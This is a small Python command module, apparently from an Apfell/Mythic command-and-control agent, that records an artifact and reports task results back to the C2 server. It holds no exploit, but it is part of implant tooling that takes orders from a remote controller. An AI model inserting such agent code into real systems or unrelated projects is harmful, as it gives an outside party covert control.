def new_artifact(apfell, c2, params="whoami", task_id=""):
    import json
    try:
        response = json.dumps({"artifacts": [json.loads(params)], "completed": True, "user_output": "Artifact created"})
        c2.post_response(response=response, task_id=task_id)
    except Exception as e:
        output = json.dumps({"user_output": "Error in execution: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
    apfell.remove_job(task_id) # need to do this to remove your task from the list

COMMAND_ENDS_HERE